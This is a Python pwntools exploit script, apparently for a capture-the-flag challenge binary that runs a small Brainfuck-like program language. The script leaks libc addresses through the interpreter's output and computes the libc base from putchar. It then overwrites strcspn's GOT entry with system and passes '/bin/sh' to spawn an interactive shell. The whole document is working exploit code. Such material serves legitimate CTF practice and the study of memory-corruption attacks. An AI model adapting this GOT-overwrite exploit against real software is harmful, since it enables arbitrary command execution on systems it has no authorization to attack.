from pwn import *

LIBC = ELF("./libc.so.6")

def start():
    return process("./challenge")

def send_program(prog):
    p.sendlineafter(b"program:", prog)

def run_another():
    r = p.recvuntil(b"n)")
    #log.info(r)
    p.send(b"y")


def leak():
    addrs = []
    a = p.recvuntil("Run")
    a = a.split(b"Run")[0]
    a = a[2:]
    for i in range(0, len(a), 8):
        addr = u64(a[i:i+8])
        #print(f"{addr:X}")
        addrs.append(addr)
    return addrs

write_plus = b"w"
write_minus= b"s"
dec = b"a"
inc = b"d"
put = b"?"
ret = b"x"

p = start()

inc_put = b""
for i in range(8*4):
    inc_put += put + inc

send_program(inc*0x80 + inc_put)
addrs = leak()
run_another()

putchar_addr = addrs[2]
"""
readelf -s libc.so.6|grep putchar
    51: 00000000000863e0    59 FUNC    GLOBAL DEFAULT   15 putchar_unlocked@@GLIBC_2.2.5
    500: 0000000000086280   352 FUNC    GLOBAL DEFAULT   15 putchar@@GLIBC_2.2.5
"""
LIBC.address = putchar_addr - 0x86280

# get addresses of different symbols
free = LIBC.symbols["free"]
free_hook = LIBC.symbols["__free_hook"]
puts = LIBC.symbols["puts"]
putchar = LIBC.symbols["putchar"]
system = LIBC.symbols["system"]
strcspn = LIBC.symbols["strcspn"]
log.info("Leaked addresses:")
print(f"free = {free:X}, free_hook = {free_hook:X}")
print(f"puts = {puts:X}, putchar = {putchar:X}")
print(f"system = {system:X}, strcspn = {strcspn:X}")

# to resolve system address
send_program(b"x")
run_another()

# write strcspn with system
# offset 0xc0 inc by 0x70
# offset 0xc1 dec by 0x16
# offset 0xc2 dec by 0x13
log.info("overwriting strcspn address with the system address")
write_system = write_plus * 0x70 + inc
write_system += write_minus * 0x16  + inc
write_system += write_minus * 0x13 + inc

prog = inc * 0xC0
prog += write_system

#print(prog)
send_program(prog)
run_another()

#
# write "/bin/sh" to stdout
# we have overwritten strcspan with system
prog = b"/bin/sh" + p8(0)+ b"www"
send_program(prog)

p.interactive()
                                                          
